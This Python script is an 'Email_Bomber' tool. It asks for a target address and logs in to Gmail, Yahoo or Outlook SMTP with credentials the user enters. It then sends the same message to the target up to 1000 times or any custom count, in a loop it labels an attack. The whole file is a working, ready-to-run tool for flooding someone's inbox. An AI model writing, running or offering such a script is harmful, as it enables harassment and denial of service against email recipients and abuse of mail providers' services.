import smtplib
import sys

class bcolors:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"

def banner():
    print(bcolors.RED + "----- Email_Bomber :) -----\nDev. eewwoo")
    print (bcolors.RED + '''                  
     ___________        __________              ___.                 
     \_   _____/        \______   \ ____   _____\_ |__   ___________ 
      |    __)_   ______ |    |  _//  _ \ /     \| __ \_/ __ \_  __ \
      |        \ /_____/ |    |   (  <_> )  Y Y  \ \_\ \  ___/|  | \/
     /_______  /         |______  /\____/|__|_|  /___  /\___  >__|   
             \/                 \/             \/    \/     \/     
                                Author :eewwoo  
                                   *#&@&#*                                    
                          &@@%#####################&@@%                         
                     @@###################################@@                    
                 @@#############@@@@@%#(((#&@@@@&#############@@                
              @##########@@&(((((((((((((((((((((((((@@&#########%@             
           @&########@@(((((((((((((((((((((((((((((((((((@@########@&          
         @########@%(((((((((((((((((((((((((((((((((((((((((@@#######&@        
       @%######&@(((((((((((((((((((((((((((((((((((((((((((((((@#######@&      
      @######@@((((((((((((((((((((((%@@@%((((((((((((((((((((((((@%######@     
    @&######@((((((((((((((((((((((@@@@@@@@@@(((((((((((((((((((((((@######@(   
   @######@%((((((((((((((((((((((@@@ @@@@@@@%(((((((((((((((((((((((@%#####&&  
  @%#####@((((((((((((((#@,    . @@,@@@@@@@@@(((((((((((((((((((((((((&&#####&/ 
 .@#####@((((((((((((((&@@@@(((#%@&*@@@@@@@@(((@(((@@((((((((((((((((((@%#####@ 
 @######@((((((((((((((((((((((((((#@@@@@@((((@((@@((&@((((@@#((((((((((@######@
 @#####@((((((((((((((((((((((((((&@@@@@@@@@@@(@@(#@@@@@@(((((((((((((((#&#####@
(%#####@(((((#%%((((((((((((((((@@@@@@@@@@@@@@@@@@@@@@(((((((((((((((((((@#####&     
&######@(((((((((((#@#((((((((((@@@@@@@@@@@@@#&@@@(@@@@@@@@&(((((((((((((@#####%
/%#####@(((((((((((((((((@@(((((@@@@@@&@@@@@@@@,@@@@@@@%%@@@@@@@(((((((((@#####@
 @#####@(((((((@@@(%@@@@@@#@@@%@((&@% @@@@@@@@@@@@@@@@@@@@@(((((((((((((#&#####@
 @######@((((((((((((((((&@@@%(@%@ @(@@@&@@@@@@@@@@%#%@@@@@@@@@(((((((((@######@
  @#####@#(((((((((@@(((((((((((((((%@@@@@((((@@@@@@(((@@@@@@@@@@@(((((@######@ 
  @&#####@((((((((((((((((((((((((((((((@&((((#@@@@@(((((&@@@@@@@@%(((@&#####@, 
   @%#####@&(((((((((((((((((((((((((((((((((#@(((%(((((((((&((((((((@######@#  
    %@######@((((((((((((((((((((((((#@@/*  #@@%((((((((((((((((((((@######@,   
      @######&@(((((((((((((((((((((((#(((((((((((((((((((((((((((@#######@     
       @@######%@(((((((((((((((((((((((((((((((((((((((((((((((@#######@#      
         @&#######@&(((((((((((((((((((((((((((((((((((((((((@@#######@&        
           %@########@@(((((((((((((((((((((((((((((((((((@&########@*          
              @&#########&@@(((((((((((((((((((((((((@@%#########@@             
                 @@#############&@@@@@&%%%&@@@@@%#############@@                
                     @@%#################################&@&                    
                          *@@@####################%@@@.        ''')
    
class email_bomber:
    count = 0
    def __init__(self):
        try:
            print(bcolors.YELLOW + "----- Initializing... -----")
            self.target = str(input("Enter target email... ")) 
            self.mode = int(input("Enter BOMB mode (1(1000), 2(500), 3(250), 4(custom)... )"))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print("ERROR: Invalid Option. Ending program... ")
                sys.exit(1)
        except Exception as e:
            print(f"ERROR: {e}")

    def bomb(self):
        try:
            print("----- Setting up bomb -----")
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input("How many emails would you like to send?\n"))
            print(f"\n+----- You have selected BOMB mode {self.mode} and {self.amount} emails. -----")
        except Exception as e:
            print(f'ERROR: {e}')
    
    def email(self):
        try:
            print("\n----- Setting up email -----")
            self.server = str(input("Enter email server or select one | 1:Gmail 2:Yahoo 3: OutLook... "))
            premade = ["1", "2", "3"]
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input("Enter port number... "))
            if default_port == True:
                self.port = int(587)


            if self.server == "1":
                self.server = "smtp.gmail.com"
            elif self.server == "2":
                self.server = "smtp.mail.yahoo.com"
            elif self.server == "3":
                self.server = "smtp-mail.outlook.com"

            self.fromAddr = str(input("Enter the email address you would like to send from... "))
            self.fromPwd = str(input("Enter password for the from email... "))
            self.subject = str(input("Enter subject of the email... "))
            self.message = str(input("Enter message... "))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n''' % (self.fromAddr, self.target, self.subject, self.message)
            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f"ERROR: {e}")

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(f"BOMB: {self.count}")
        except Exception as e:
            print(f"ERROR: {e}")
    
    def attack(self):
        print("\n----- Attacking -----")
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print("\n----- Attack Finished -----")
        sys.exit(0)

if __name__ == "__main__":
    banner()
    bomb = email_bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
